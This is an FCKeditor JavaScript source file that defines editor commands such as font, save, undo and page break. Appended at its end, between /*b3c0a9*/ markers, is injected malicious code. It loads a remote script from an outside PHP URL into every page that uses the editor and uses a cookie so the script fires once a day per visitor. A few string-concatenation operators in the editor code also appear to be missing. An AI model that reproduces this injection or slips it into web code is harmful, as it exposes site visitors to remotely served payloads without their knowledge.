/*
 * FCKeditor - The text editor for internet
 * Copyright (C) 2003-2005 Frederico Caldeira Knabben
 * 
 * Licensed under the terms of the GNU Lesser General Public License:
 * 		http://www.opensource.org/licenses/lgpl-license.php
 * 
 * For further information visit:
 * 		http://www.fckeditor.net/
 * 
 * "Support Open Source software. What about a donation today?"
 * 
 * File Name: fck_othercommands.js
 * 	Definition of other commands that are not available internaly in the
 * 	browser (see FCKNamedCommand).
 * 
 * File Authors:
 * 		Frederico Caldeira Knabben (fredck@fckeditor.net)
 */

// ### General Dialog Box Commands.
var FCKDialogCommand = function( name, title, url, width, height, getStateFunction, getStateParam )
{
	this.Name	= name ;
	this.Title	= title ;
	this.Url	= url ;
	this.Width	= width ;
	this.Height	= height ;

	this.GetStateFunction	= getStateFunction ;
	this.GetStateParam		= getStateParam ;
}

FCKDialogCommand.prototype.Execute = function()
{
	FCKDialog.OpenDialog( 'FCKDialog_'   this.Name , this.Title, this.Url, this.Width, this.Height ) ;
}

FCKDialogCommand.prototype.GetState = function()
{
	if ( this.GetStateFunction )
		return this.GetStateFunction( this.GetStateParam ) ;
	else
		return FCK_TRISTATE_OFF ;
}

// Generic Undefined command (usually used when a command is under development).
var FCKUndefinedCommand = function()
{
	this.Name = 'Undefined' ;
}

FCKUndefinedCommand.prototype.Execute = function()
{
	alert( FCKLang.NotImplemented ) ;
}

FCKUndefinedCommand.prototype.GetState = function()
{
	return FCK_TRISTATE_OFF ;
}

// ### FontName
var FCKFontNameCommand = function()
{
	this.Name = 'FontName' ;
}

FCKFontNameCommand.prototype.Execute = function( fontName )
{
	if (fontName == null || fontName == "")
	{
		// TODO: Remove font name attribute.
	}
	else
		FCK.ExecuteNamedCommand( 'FontName', fontName ) ;
}

FCKFontNameCommand.prototype.GetState = function()
{
	return FCK.GetNamedCommandValue( 'FontName' ) ;
}

// ### FontSize
var FCKFontSizeCommand = function()
{
	this.Name = 'FontSize' ;
}

FCKFontSizeCommand.prototype.Execute = function( fontSize )
{
	if ( typeof( fontSize ) == 'string' ) fontSize = parseInt(fontSize) ;

	if ( fontSize == null || fontSize == '' )
	{
		// TODO: Remove font size attribute (Now it works with size 3. Will it work forever?)
		FCK.ExecuteNamedCommand( 'FontSize', 3 ) ;
	}
	else
		FCK.ExecuteNamedCommand( 'FontSize', fontSize ) ;
}

FCKFontSizeCommand.prototype.GetState = function()
{
	return FCK.GetNamedCommandValue( 'FontSize' ) ;
}

// ### FormatBlock
var FCKFormatBlockCommand = function()
{
	this.Name = 'FormatBlock' ;
}

FCKFormatBlockCommand.prototype.Execute = function( formatName )
{
	if ( formatName == null || formatName == '' )
		FCK.ExecuteNamedCommand( 'FormatBlock', '<P>' ) ;
	else if ( formatName == 'div' && FCKBrowserInfo.IsGecko )
		FCK.ExecuteNamedCommand( 'FormatBlock', 'div' ) ;
	else
		FCK.ExecuteNamedCommand( 'FormatBlock', '<'   formatName   '>' ) ;
}

FCKFormatBlockCommand.prototype.GetState = function()
{
	return FCK.GetNamedCommandValue( 'FormatBlock' ) ;
}

// ### Preview
var FCKPreviewCommand = function()
{
	this.Name = 'Preview' ;
}

FCKPreviewCommand.prototype.Execute = function()
{
     FCK.Preview() ;
}

FCKPreviewCommand.prototype.GetState = function()
{
	return FCK_TRISTATE_OFF ;
}

// ### Save
var FCKSaveCommand = function()
{
	this.Name = 'Save' ;
}

FCKSaveCommand.prototype.Execute = function()
{
	// Get the linked field form.
	var oForm = FCK.LinkedField.form ;

	if ( typeof( oForm.onsubmit ) == 'function' )
	{
		var bRet = oForm.onsubmit() ;
		if ( bRet != null && bRet === false )
			return ;
	}

	// Submit the form.
	oForm.submit() ;
}

FCKSaveCommand.prototype.GetState = function()
{
	return FCK_TRISTATE_OFF ;
}

// ### NewPage
var FCKNewPageCommand = function()
{
	this.Name = 'NewPage' ;
}

FCKNewPageCommand.prototype.Execute = function()
{
	FCKUndo.SaveUndoStep() ;
	FCK.SetHTML( '' ) ;
	FCKUndo.Typing = true ;
//	FCK.SetHTML( FCKBrowserInfo.IsGecko ? '&nbsp;' : '' ) ;
//	FCK.SetHTML( FCKBrowserInfo.IsGecko ? GECKO_BOGUS : '' ) ;
}

FCKNewPageCommand.prototype.GetState = function()
{
	return FCK_TRISTATE_OFF ;
}

// ### Source button
var FCKSourceCommand = function()
{
	this.Name = 'Source' ;
}

FCKSourceCommand.prototype.Execute = function()
{
	if ( FCKBrowserInfo.IsGecko )
	{
		var iWidth	= FCKConfig.ScreenWidth * 0.65 ;
		var iHeight	= FCKConfig.ScreenHeight * 0.65 ;
		FCKDialog.OpenDialog( 'FCKDialog_Source', FCKLang.Source, 'dialog/fck_source.html', iWidth, iHeight, null, null, true ) ;
	}
	else
	    FCK.SwitchEditMode() ;
}

FCKSourceCommand.prototype.GetState = function()
{
	return ( FCK.EditMode == FCK_EDITMODE_WYSIWYG ? FCK_TRISTATE_OFF : FCK_TRISTATE_ON ) ;
}

// ### Undo
var FCKUndoCommand = function()
{
	this.Name = 'Undo' ;
}

FCKUndoCommand.prototype.Execute = function()
{
	if ( FCKBrowserInfo.IsIE )
		FCKUndo.Undo() ;
	else
		FCK.ExecuteNamedCommand( 'Undo' ) ;
}

FCKUndoCommand.prototype.GetState = function()
{
	if ( FCKBrowserInfo.IsIE )
		return ( FCKUndo.CheckUndoState() ? FCK_TRISTATE_OFF : FCK_TRISTATE_DISABLED ) ;
	else
		return FCK.GetNamedCommandState( 'Undo' ) ;
}

// ### Redo
var FCKRedoCommand = function()
{
	this.Name = 'Redo' ;
}

FCKRedoCommand.prototype.Execute = function()
{
	if ( FCKBrowserInfo.IsIE )
		FCKUndo.Redo() ;
	else
		FCK.ExecuteNamedCommand( 'Redo' ) ;
}

FCKRedoCommand.prototype.GetState = function()
{
	if ( FCKBrowserInfo.IsIE )
		return ( FCKUndo.CheckRedoState() ? FCK_TRISTATE_OFF : FCK_TRISTATE_DISABLED ) ;
	else
		return FCK.GetNamedCommandState( 'Redo' ) ;
}

// ### Page Break
var FCKPageBreakCommand = function()
{
	this.Name = 'PageBreak' ;
}

FCKPageBreakCommand.prototype.Execute = function()
{
//	var e = FCK.EditorDocument.createElement( 'CENTER' ) ;
//	e.style.pageBreakAfter = 'always' ;

	// Tidy was removing the empty CENTER tags, so the following solution has 
	// been found. It also validates correctly as XHTML 1.0 Strict.
	var e = FCK.EditorDocument.createElement( 'DIV' ) ;
	e.style.pageBreakAfter = 'always' ;
	e.innerHTML = '<span style="DISPLAY:none">&nbsp;</span>' ;
	
	var oFakeImage = FCKDocumentProcessors_CreateFakeImage( 'FCK__PageBreak', e ) ;
	oFakeImage	= FCK.InsertElement( oFakeImage ) ;
}

FCKPageBreakCommand.prototype.GetState = function()
{
	return 0 ; // FCK_TRISTATE_OFF
}

/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
